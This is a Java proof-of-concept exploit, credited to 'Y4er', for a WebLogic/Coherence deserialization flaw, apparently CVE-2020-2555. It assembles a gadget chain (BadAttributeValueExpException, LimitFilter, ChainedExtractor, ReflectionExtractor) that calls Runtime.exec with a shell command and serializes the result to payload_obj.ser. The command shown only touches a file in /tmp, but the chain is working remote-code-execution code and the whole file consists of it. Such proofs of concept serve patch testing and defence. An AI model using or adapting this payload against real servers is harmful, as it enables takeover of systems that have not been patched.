import com.tangosol.util.filter.LimitFilter;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

/*
 *  BadAttributeValueExpException.readObject()
 *  com.tangosol.util.filter.LimitFilter.toString()
 *  com.tangosol.util.extractor.ChainedExtractor.extract()
 *  com.tangosol.util.extractor.ReflectionExtractor.extract()
 *  Method.invoke()
 *  Runtime.exec()
 *
 *  PoC by Y4er
 */
public class Weblogic_2555
{
	public static void main(String args[]) throws Exception
	{
		ReflectionExtractor extractor = new ReflectionExtractor("getMethod", new Object[]{ "getRuntime", new Class[0] });
		ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{ null, new Object[0] });
		ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{ new String[]{ "/bin/sh", "-c", "touch /tmp/blah_ze_blah" } });

		ReflectionExtractor extractors[] = { extractor, extractor2, extractor3 };
		ChainedExtractor chainedExt = new ChainedExtractor(extractors);
		LimitFilter limitFilter = new LimitFilter();

		Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
		m_comparator.setAccessible(true);
		m_comparator.set(limitFilter, chainedExt);

		Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
		m_oAnchorTop.setAccessible(true);
		m_oAnchorTop.set(limitFilter, Runtime.class);

		BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
		Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
		field.setAccessible(true);
		field.set(badAttributeValueExpException, limitFilter);

		// Serialize object & save to file
		FileOutputStream fos = new FileOutputStream("payload_obj.ser");
		ObjectOutputStream os = new ObjectOutputStream(fos);
		os.writeObject(badAttributeValueExpException);
		os.close();

	}
}
